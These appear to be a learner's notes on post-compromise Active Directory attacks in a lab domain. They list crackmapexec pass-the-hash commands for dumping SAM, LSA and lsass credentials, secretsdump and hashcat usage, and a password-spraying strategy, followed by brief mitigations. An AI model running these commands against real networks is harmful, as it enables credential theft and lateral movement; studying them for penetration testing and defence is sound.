# Attacking Active Directory - Post-Compromise Attacks

## Introduction

- we need some credentials for these attacks to be effective.

## Pass Attacks Overview

- `apt install crackmapexec`
- `crackmapexec smb --help` to see what we need to provide

## Pass Attacks

- `crackmapexec smb 192.168.92.0/24 -u fcastle -d MARVEL.local -p 'Password1'`
- `crackmapexec smb 192.168.92.0/24 -u fcastle -d MARVEL.local -p 'Password1' --sam` to dump the sam hashes
- `crackmapexec smb 192.168.92.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth --sam` or `crackmapexec smb 192.168.92.0/24 -u "David Lieberman" -H aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0 --local-auth --sam`
- `crackmapexec smb 192.168.92.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth --shares` to see shared folders
- `crackmapexec smb 192.168.92.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth --lsa` to see LSA secrets

### Using modules

- `crackmapexec smb 192.168.92.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -M lsassy`
- everything is stored in CME database: `cmedb`, then `hosts` and `creds` in the shell

## Dumping and Cracking Hashes

- `secretsdump.py MARVEL.local/administrator:'P@$$w0rd!'@192.168.92.146`: there can be clear text passwords and logins in here

- Need the NT portion, not the LM
- Full hash: `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`
- LM Portion: `aad3b435b51404eeaad3b435b51404ee`
- NT Portion: `31d6cfe0d16ae931b73c59d7e0c089c0`
- `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt`

- once you have fcastle hash, you crack it, you spray the password. Once you found a new login, you secretdump thos logins. Now, you can use local admin hashes to respray the network with local accounts (reducing the risk to block an account).

## Pass Attack Mitigations

### Limit Account re-use

- Avoid re-using local admin password (error with fcastle)
- Disable guest and Admin accounts
- Limit who is a local admin (least privilege)

### Utilize Strong Passwords

- The longer, the better (>14 characters)
- Avoid using common words
- Long sentences

### Privilege Access Management (PAM)

- Check out/in sensitive accounts when needed
- Automatically rotate passwords on check out/in
- Limits pass attacks as hash/passwords is strong and constantly rotated

## Kerberoasting Overview

## Kerberoasting Walkthrough

## Kerberoasting Mitigation

## Token Impersonation Overview

## Token Impersonation Walkthrough

## Token Impersonation Mitigation

## LNK File Attacks

## GPP / cPassword Attacks and Mitigations

## Mimikatz Overview

## Credential Dumping with Mimikatz

## Post-Compromise Attack Strategy
